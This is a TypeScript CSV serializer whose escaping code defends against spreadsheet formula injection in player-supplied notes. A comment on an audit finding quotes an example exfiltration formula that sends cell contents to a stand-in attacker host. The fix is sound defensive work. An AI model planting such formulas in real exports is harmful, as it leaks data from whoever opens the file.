/** Minimal CSV serializer — no external dependency, escapes quotes/commas/newlines per RFC 4180. */
export function toCsv(rows: Array<Record<string, unknown>>): string {
  if (rows.length === 0) return '';
  // Union of every row's keys (first-seen order), so rows of different shapes don't silently drop columns.
  const headers = [...new Set(rows.flatMap((r) => Object.keys(r)))];
  const escape = (v: unknown): string => {
    if (v === null || v === undefined) return '';
    let s = v instanceof Date ? v.toISOString() : String(v);
    // Finding SEC-11 (Medium): CSV formula injection. Exported columns
    // include player-supplied free text (deposit/withdrawal `notes`, no
    // content restriction) — a value like `=HYPERLINK("http://evil/?"&A1)`
    // executes as a live formula the moment an admin opens the export in
    // Excel/LibreOffice/Sheets, not just displays as text. A leading
    // apostrophe forces spreadsheet apps to treat the cell as plain text;
    // it's invisible in the rendered cell and doesn't affect RFC 4180 parsing.
    if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const lines = [headers.join(',')];
  for (const row of rows) {
    lines.push(headers.map((h) => escape(row[h])).join(','));
  }
  return lines.join('\n');
}
